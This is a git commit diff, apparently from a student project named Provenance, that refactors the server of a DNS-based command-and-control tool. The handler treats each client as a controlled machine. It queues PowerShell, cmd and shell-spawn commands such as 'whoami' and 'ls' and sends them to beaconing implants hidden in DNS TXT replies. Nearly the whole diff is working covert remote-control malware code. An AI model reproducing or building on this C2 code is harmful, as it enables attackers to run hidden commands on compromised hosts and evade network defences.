a787e3f11470ea56aaac495ae5949f71ee47f42e
Ryan Cervantes <rxc3202@rit.edu>
2020-01-21 20:16:30 -0500

    Temporarily moved ACKing of packets from beacon
    As of right now there is no way to send an alternative DNS request
    other than a standard query. Will investigate later and put in new
    branch

--- Provenance.py
+++ Provenance.py
@@ -21,7 +21,7 @@ def main():
 		print(f"[INFO] Server starting on {socket[0]}:{socket[1]}.")
 		if args.threaded:
 			server = ThreadedProvenanceServer(socket, IndividualClientHandler, args)
-			 # Start a thread with the server -- that thread will then start one
+			# Start a thread with the server -- that thread will then start one
 			# more thread for each request
 			server_thread = threading.Thread(target=server.serve_forever)
 			# Exit the server thread when the main thread terminates
@@ -34,7 +34,6 @@ def main():
 			server.serve_forever()
 	except KeyboardInterrupt:
 		sys.exit(0)
-
 
 
 if __name__ == '__main__':
--- handler.py
+++ handler.py
@@ -1,9 +1,21 @@
 import dnslib
 from socketserver import UDPServer, BaseRequestHandler
 import threading
+import time
 
 class IndividualClientHandler(BaseRequestHandler):
     """ This represents a machine being controlled by Provenance"""
+
+    RR = {
+        "TXT": (dnslib.QTYPE.TXT, dnslib.TXT)
+    }
+
+    command_type = {
+        "NONE": 0,
+        "POWERSHELL_EXECUTE": 1,
+        "CMD_EXECUTE" : 2,
+        "SPAWN_SHELL": 3
+    }
 
     """ Builtin Functions"""
     def __init__(self, request, client_address, server, rrtype="TXT", name=None):
@@ -16,10 +28,10 @@ class IndividualClientHandler(BaseRequestHandler):
         self.name = name
         self.ip = client_address[0]
         self.active = False
-        self.record_type = "TXT"
+        self.record_type = rrtype
         self.latest_request_id = None
         self.latest_request_confirmed = False
-        self.queued_commands = [("POWERSHELL_EXECUTE", "whoami")]
+        self.queued_commands = [("POWERSHELL_EXECUTE", "whoami"), ("POWERSHELL_EXECUTE", "ls")]
         self.sent_commands = []
     
     def __repr__(self):
@@ -28,28 +40,22 @@ class IndividualClientHandler(BaseRequestHandler):
     """ Subclass Functions"""
     def handle(self):
         data = self.get_data()
-        print(threading.current_thread().name)
         try:
             request = dnslib.DNSRecord.parse(data)
-		    # Check IDs for repeat numbers, ignore if processed
-            if not self.latest_request_id == request.header.id:
+            if request.header.id != self.latest_request_id:
                 if request.header.get_opcode() == 0:
-                    self.latest_request_id = request.header.id
-                    latest_request_confirmed = False
+                    self.latest_request_confirmed = False
                     self.send_cmd(request)
-            elif request.header.get_opcode() == 5:
-                print("ack sent")
-                send_ack(request)
-        except dnslib.DNSError:
+                    self.latest_request_id = request.header.id
+        except dnslib.DNSError as e:
             print("[INFO] Incorrectly formatted DNS Query. Skipping")
 
     def get_data(self):
         return self.request[0].strip()
 
-
     """ Provenance Specific Functions"""
     def queue_cmd(self, type, cmd):
-        self.queued_commands.append((command_type[type], cmd))
+        self.queued_commands.append((self.command_type[type], cmd))
 
     def send_ack(self, request):
         ack = request.reply()
@@ -57,36 +63,26 @@ class IndividualClientHandler(BaseRequestHandler):
         socket.sendto(ack.pack(), self.client_address)
 
     def send_cmd(self, request):
-        RR = {
-            "TXT": (dnslib.QTYPE.TXT, dnslib.TXT),
-		}
-        command_type = {
-            "NONE": 0,
-            "POWERSHELL_EXECUTE": 1,
-            "CMD_EXECUTE" : 2,
-            "SPAWN_SHELL": 3 
-        }
-
         if self.queued_commands:
-			# TODO: use dictionary switch to encode different packets
+            # TODO: use dictionary switch to encode different packets
             opcode, cmd = self.queued_commands.pop()
         else:
             opcode, cmd = ("NONE", "NONE")
 
-        rr_type, rr_constructor  = RR[self.record_type]
+        rr_type, rr_constructor = self.RR[self.record_type]
         # Generate skeleton question for packet
         command_packet = request.reply() 
         # Generate the response to the question
         command_packet.add_answer(
             dnslib.RR(
-                rname="fakedomain.com",
-				rtype=rr_type,
+                rname=request.get_q().get_qname(),
+                rtype=rr_type,
                 rclass=dnslib.CLASS.IN,
-				rdata=rr_constructor(f"<{command_type[opcode]}>:{cmd}"),
+                rdata=rr_constructor(f"<{self.command_type[opcode]}>:{cmd}"),
                 ttl=1337))
         # send command
         socket = self.request[1]
-        print(f"[INFO] Sending command to {self.client_address}")
+        print(f"[INFO] Sending {self.command_type[opcode]} to {self.client_address}")
         socket.sendto(command_packet.pack(), self.client_address)
         self.sent_commands.append((request.header.id,cmd))
 
